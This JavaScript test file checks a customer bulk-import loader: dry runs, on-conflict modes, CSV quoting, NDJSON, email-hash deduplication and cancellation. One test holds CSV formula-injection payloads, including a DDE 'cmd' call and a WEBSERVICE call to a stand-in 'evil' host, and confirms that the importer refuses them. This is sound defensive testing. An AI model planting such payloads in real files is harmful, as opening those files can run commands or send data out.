"use strict";
/**
 * customer-import — bulk migration loader for the `customers` table.
 *
 * Layer 1 because every successful row writes through the customers
 * primitive (which writes the customers row + derives the
 * SHA3-512 email_hash via b.crypto.namespaceHash). Two migrations
 * load into the same in-memory SQLite — 0006 (customers /
 * customer_passkeys) for the destination, 0061 (customer_imports)
 * for the per-run audit trail.
 *
 * Coverage:
 *   - dryRun: per-row outcome breakdown without writing
 *   - importRows on_conflict: 'update' / 'skip' / 'error' branch on
 *     existing-email collision (correct counter for each)
 *   - CSV with quoted commas inside display_name field
 *   - NDJSON happy path: one row per line, parses cleanly
 *   - CSV-injection refusal: leading `=` / `+` / `WEBSERVICE` in a
 *     cell refused by b.guardCsv before any row processes
 *   - dedup via email hash: domain-case-equivalent addresses collide
 *     on a single email_hash
 *   - dryRun + importRows produce the same outcome breakdown for
 *     the same input (created + skipped + errored counters match)
 *   - cancelInflight: flips the run row to `cancelled`
 *   - factory validation refuses missing opts.customers
 */

var nodeFs   = require("node:fs");
var nodePath = require("node:path");
var { DatabaseSync } = require("node:sqlite");

var bShop          = require("../../lib");
var customerImport = require("../../lib/customer-import");
var helpers        = require("../helpers");
var check          = helpers.check;
var assert         = helpers.assert;

var MIG_CUSTOMERS = nodePath.resolve(__dirname, "..", "..", "migrations-d1", "0006_customers.sql");
var MIG_IMPORTS   = nodePath.resolve(__dirname, "..", "..", "migrations-d1", "0061_customer_imports.sql");

function _splitSchema(text) {
  var noComments = text.replace(/--[^\n]*\n/g, "\n");
  return noComments.split(/;\s*(?:\n|$)/).map(function (s) { return s.trim(); }).filter(Boolean);
}

function _makeQuery() {
  var db = new DatabaseSync(":memory:");
  db.prepare("PRAGMA foreign_keys = ON").run();
  [MIG_CUSTOMERS, MIG_IMPORTS].forEach(function (p) {
    _splitSchema(nodeFs.readFileSync(p, "utf8")).forEach(function (s) {
      db.prepare(s).run();
    });
  });
  return async function (sql, params) {
    var stmt = db.prepare(sql);
    var verb = sql.replace(/^\s+|\s*--[^\n]*\n/g, "").trim().split(/\s+/)[0].toUpperCase();
    if (verb === "INSERT" || verb === "UPDATE" || verb === "DELETE" || verb === "REPLACE") {
      var info = stmt.run.apply(stmt, params || []);
      return {
        rows:      [],
        rowCount:  Number(info.changes),
        lastRowId: info.lastInsertRowid != null ? Number(info.lastInsertRowid) : null,
      };
    }
    var rows = stmt.all.apply(stmt, params || []);
    return { rows: rows, rowCount: rows.length };
  };
}

function _build(query) {
  var customers = bShop.customers.create({ query: query });
  var imp       = customerImport.create({ query: query, customers: customers });
  return { query: query, customers: customers, imp: imp };
}

// ---- _dryRunOutcomes --------------------------------------------------

async function _dryRunOutcomes() {
  var ctx = _build(_makeQuery());

  // Pre-seed one customer so the dryRun sees a conflict against the DB.
  await ctx.customers.register({ email: "alice@example.com", display_name: "Alice" });

  var rows = [
    { email: "alice@example.com", display_name: "Alice Renamed" }, // conflict (existing)
    { email: "bob@example.com",   display_name: "Bob" },           // would-create
    { email: "carol@example.com", display_name: "Carol" },         // would-create
    { email: "bob@example.com",   display_name: "Bob Twice" },     // intra-batch conflict
    { email: "not-an-email",      display_name: "Bad" },           // error
  ];
  var rv = await ctx.imp.dryRun(rows);
  check("dryRun flag set",       rv.dry_run === true);
  check("dryRun processed 5",    rv.processed === 5);
  check("dryRun created 2",      rv.created === 2);    // bob + carol
  check("dryRun skipped 2",      rv.skipped === 2);    // alice conflict + bob-twice
  check("dryRun errored 1",      rv.errored === 1);
  check("dryRun per_row count",  rv.per_row.length === 5);
  check("dryRun row1 conflict",  rv.per_row[0].outcome === "would_conflict");
  check("dryRun row2 create",    rv.per_row[1].outcome === "would_create");
  check("dryRun row5 error",     rv.per_row[4].outcome === "error");

  // Nothing was written.
  var count = (await ctx.query("SELECT COUNT(*) AS n FROM customers")).rows[0].n;
  check("dryRun wrote nothing",  Number(count) === 1);  // only the pre-seeded alice
}

// ---- _importRowsOnConflict (3 modes) -----------------------------------

async function _importRowsOnConflictUpdate() {
  var ctx = _build(_makeQuery());
  await ctx.customers.register({ email: "alice@example.com", display_name: "Original Alice" });

  var rv = await ctx.imp.importRows({
    rows: [
      { email: "alice@example.com", display_name: "Updated Alice" },
      { email: "bob@example.com",   display_name: "Bob" },
    ],
    on_conflict: "update",
  });
  check("update: status complete", rv.status === "complete");
  check("update: created 1",       rv.created === 1);
  check("update: updated 1",       rv.updated === 1);
  check("update: skipped 0",       rv.skipped === 0);
  check("update: errored 0",       rv.errored === 0);

  var aliceHash = ctx.customers.hashEmail("alice@example.com");
  var alice = await ctx.customers.byEmailHash(aliceHash);
  check("update: alice display_name overwritten", alice.display_name === "Updated Alice");

  var runRow = (await ctx.query(
    "SELECT * FROM customer_imports WHERE id = ?1",
    [rv.run_id],
  )).rows[0];
  check("update: run row persisted", runRow && runRow.status === "complete" && runRow.source === "api");
  check("update: run row counters",  Number(runRow.rows_updated) === 1 && Number(runRow.rows_created) === 1);
}

async function _importRowsOnConflictSkip() {
  var ctx = _build(_makeQuery());
  await ctx.customers.register({ email: "alice@example.com", display_name: "Original Alice" });

  var rv = await ctx.imp.importRows({
    rows: [
      { email: "alice@example.com", display_name: "Updated Alice" },
      { email: "bob@example.com",   display_name: "Bob" },
    ],
    on_conflict: "skip",
  });
  check("skip: created 1",   rv.created === 1);
  check("skip: skipped 1",   rv.skipped === 1);
  check("skip: updated 0",   rv.updated === 0);

  var aliceHash = ctx.customers.hashEmail("alice@example.com");
  var alice = await ctx.customers.byEmailHash(aliceHash);
  check("skip: alice display_name untouched", alice.display_name === "Original Alice");
}

async function _importRowsOnConflictError() {
  var ctx = _build(_makeQuery());
  await ctx.customers.register({ email: "alice@example.com", display_name: "Original Alice" });

  var rv = await ctx.imp.importRows({
    rows: [
      { email: "alice@example.com", display_name: "Updated Alice" },
      { email: "bob@example.com",   display_name: "Bob" },
    ],
    on_conflict: "error",
  });
  check("error: created 1",    rv.created === 1);
  check("error: errored 1",    rv.errored === 1);
  check("error: errors length", rv.errors.length === 1);
  check("error: row_index 1",   rv.errors[0].row_index === 1);
  check("error: message shape", /duplicate email_hash/.test(rv.errors[0].message));
}

// ---- _csvQuotedCommas -------------------------------------------------

async function _csvQuotedCommas() {
  var ctx = _build(_makeQuery());

  // display_name contains a comma — must round-trip through CSV
  // quoting without corrupting the row.
  var csv =
    "email,display_name\n" +
    'alice@example.com,"Alice, the First"\n' +
    'bob@example.com,"Bob ""B-Dog"" Smith"\n' +
    "carol@example.com,Carol Plain\n";

  var rv = await ctx.imp.importFromCsv(csv);
  check("csv: source recorded",    rv.source === "csv");
  check("csv: created 3",          rv.created === 3);
  check("csv: errored 0",          rv.errored === 0);

  var alice = await ctx.customers.byEmailHash(ctx.customers.hashEmail("alice@example.com"));
  check("csv: comma-in-name persisted",   alice.display_name === "Alice, the First");
  var bob = await ctx.customers.byEmailHash(ctx.customers.hashEmail("bob@example.com"));
  check("csv: double-quote escape persisted", bob.display_name === 'Bob "B-Dog" Smith');
}

// ---- _ndjsonHappyPath -------------------------------------------------

async function _ndjsonHappyPath() {
  var ctx = _build(_makeQuery());

  var ndjson =
    JSON.stringify({ email: "alice@example.com", display_name: "Alice" }) + "\n" +
    JSON.stringify({ email: "bob@example.com",   display_name: "Bob"   }) + "\n" +
    "\n" +   // blank line tolerated
    JSON.stringify({ email: "carol@example.com", display_name: "Carol" }) + "\n";

  var rv = await ctx.imp.importFromNdjson(ndjson);
  check("ndjson: source recorded",  rv.source === "ndjson");
  check("ndjson: created 3",        rv.created === 3);
  check("ndjson: errored 0",        rv.errored === 0);

  // Round-trip via streaming async-iterable: an async generator
  // yields the same payload chunked across multiple chunks.
  var ctx2 = _build(_makeQuery());
  var chunks = [
    JSON.stringify({ email: "dave@example.com",  display_name: "Dave" }) + "\n",
    JSON.stringify({ email: "erin@example.com",  display_name: "Erin" }) + "\n",
  ];
  async function* asyncIter() {
    for (var i = 0; i < chunks.length; i += 1) yield chunks[i];
  }
  var rv2 = await ctx2.imp.importFromNdjson(asyncIter());
  check("ndjson async-iter: created 2", rv2.created === 2);
}

// ---- _csvInjectionRefusal ---------------------------------------------

async function _csvInjectionRefusal() {
  var ctx = _build(_makeQuery());

  // Formula-injection in display_name cell — guardCsv strict refuses
  // before any row is processed.
  var bad1 = 'email,display_name\nalice@example.com,"=cmd|/c calc!A1"\n';
  await assert.rejects(ctx.imp.importFromCsv(bad1), /content-safety guard/);

  var bad2 = 'email,display_name\nbob@example.com,"+SUM(A1:A10)"\n';
  await assert.rejects(ctx.imp.importFromCsv(bad2), /content-safety guard/);

  var bad3 = 'email,display_name\ncarol@example.com,"=WEBSERVICE(\\"http://evil/\\")"\n';
  await assert.rejects(ctx.imp.importFromCsv(bad3), /content-safety guard/);

  // The DB still has zero customers (the refusal happened before
  // _openRun, so no run row was created either).
  var customerCount = (await ctx.query("SELECT COUNT(*) AS n FROM customers")).rows[0].n;
  check("csv-injection: no customers written", Number(customerCount) === 0);
  var runCount = (await ctx.query("SELECT COUNT(*) AS n FROM customer_imports")).rows[0].n;
  check("csv-injection: no run rows written", Number(runCount) === 0);
}

// ---- _dedupByEmailHash ------------------------------------------------

async function _dedupByEmailHash() {
  var ctx = _build(_makeQuery());

  // The customers primitive lowercases the domain part. Two emails
  // that differ only in domain casing collide on the same email_hash;
  // the importer's dedup catches the second row and routes it through
  // on_conflict.
  var rv = await ctx.imp.importRows({
    rows: [
      { email: "alice@example.com",  display_name: "Alice One" },
      { email: "alice@EXAMPLE.COM",  display_name: "Alice Two" },   // domain-case-equiv to first
      { email: "bob@example.com",    display_name: "Bob" },
      { email: "alice@example.com",  display_name: "Alice Three" }, // exact duplicate
    ],
    on_conflict: "skip",
  });
  check("dedup: created exactly 2", rv.created === 2);   // alice + bob
  check("dedup: skipped 2",         rv.skipped === 2);   // domain-case-equiv + exact dupe

  var h1 = ctx.customers.hashEmail("alice@example.com");
  var h2 = ctx.customers.hashEmail("alice@EXAMPLE.COM");
  check("dedup: hashes match across domain casing", h1 === h2);
  var dbCount = (await ctx.query("SELECT COUNT(*) AS n FROM customers")).rows[0].n;
  check("dedup: two db rows", Number(dbCount) === 2);
}

// ---- _dryRunMatchesImportRows -----------------------------------------

async function _dryRunMatchesImportRows() {
  var ctx = _build(_makeQuery());
  // Seed two existing customers so we have realistic conflicts.
  await ctx.customers.register({ email: "alice@example.com", display_name: "Alice" });
  await ctx.customers.register({ email: "bob@example.com",   display_name: "Bob" });

  var rows = [
    { email: "alice@example.com", display_name: "Renamed Alice" }, // conflict
    { email: "carol@example.com", display_name: "Carol" },         // create
    { email: "dave@example.com",  display_name: "Dave" },          // create
    { email: "bob@example.com",   display_name: "Renamed Bob" },   // conflict
    { email: "not-an-email",      display_name: "Bad" },           // error
  ];

  var dryRv = await ctx.imp.dryRun(rows);
  var wetRv = await ctx.imp.importRows({ rows: rows, on_conflict: "skip" });

  check("dry+wet: created match",   dryRv.created === wetRv.created);
  check("dry+wet: skipped match",   dryRv.skipped === wetRv.skipped);
  check("dry+wet: errored match",   dryRv.errored === wetRv.errored);
  check("dry+wet: processed match", dryRv.processed === wetRv.processed);
}

// ---- _cancelInflight --------------------------------------------------

async function _cancelInflight() {
  var ctx = _build(_makeQuery());

  var rows = [];
  for (var i = 0; i < 20; i += 1) {
    rows.push({ email: "u" + i + "@example.com", display_name: "User " + i });
  }
  // Slow each customers query by 5ms — at 20 rows × ~3 queries = ~300ms
  // total. cancelInflight runs mid-loop and lands a partial-write state
  // deterministically across host speeds.
  var inner = ctx.query;
  var slowQuery = async function (sql, params) {
    await new Promise(function (resolve) { setTimeout(resolve, 5); }); // allow:test-promise-settimeout-sleep — deterministic mid-run cancellation budget
    return inner(sql, params);
  };
  var customers2 = bShop.customers.create({ query: slowQuery });
  var imp2       = customerImport.create({ query: ctx.query, customers: customers2 });

  var pending = imp2.importRows({ rows: rows, on_conflict: "skip" });
  // Wait until the first row landed but the import isn't done yet.
  await helpers.waitUntil(async function () {
    var c = Number((await ctx.query("SELECT COUNT(*) AS n FROM customers")).rows[0].n);
    return c >= 1 && c < 20;
  }, { timeoutMs: 5000, label: "cancelInflight: at least one row landed mid-import" });

  var cancelled = await imp2.cancelInflight();
  check("cancelInflight returns true", cancelled === true);
  var rv = await pending;
  check("cancel: status = cancelled", rv.status === "cancelled");
  check("cancel: partial create",     rv.created >= 1 && rv.created < 20);

  var runRow = (await ctx.query(
    "SELECT * FROM customer_imports WHERE id = ?1",
    [rv.run_id],
  )).rows[0];
  check("cancel: run row status",      runRow.status === "cancelled");
  check("cancel: completed_at stamped", runRow.completed_at !== null);

  var second = await imp2.cancelInflight();
  check("cancelInflight no-op returns false", second === false);

  var lr = imp2.lastReport();
  check("lastReport mirrors final report", lr && lr.run_id === rv.run_id && lr.status === "cancelled");
}

// ---- _factoryValidation -----------------------------------------------

async function _factoryValidation() {
  assert.throws(function () { customerImport.create({}); }, /customers required/);
  assert.throws(function () { customerImport.create({ customers: {}, maxRows: 0 }); }, /maxRows/);
  assert.throws(function () { customerImport.create({ customers: {}, maxErrors: -1 }); }, /maxErrors/);

  var ctx = _build(_makeQuery());
  await assert.rejects(ctx.imp.importRows({ rows: [], on_conflict: "bogus" }), /on_conflict/);
  await assert.rejects(ctx.imp.importRows({ rows: "not-an-array", on_conflict: "skip" }), /rows must be an array/);
  await assert.rejects(ctx.imp.importFromCsv("email,display_name\n"), /no data rows/);
  await assert.rejects(ctx.imp.importFromCsv(), /stream required/);
}

// ---- runner -----------------------------------------------------------

async function run() {
  await _dryRunOutcomes();
  await _importRowsOnConflictUpdate();
  await _importRowsOnConflictSkip();
  await _importRowsOnConflictError();
  await _csvQuotedCommas();
  await _ndjsonHappyPath();
  await _csvInjectionRefusal();
  await _dedupByEmailHash();
  await _dryRunMatchesImportRows();
  await _cancelInflight();
  await _factoryValidation();
}

module.exports = { run: run };
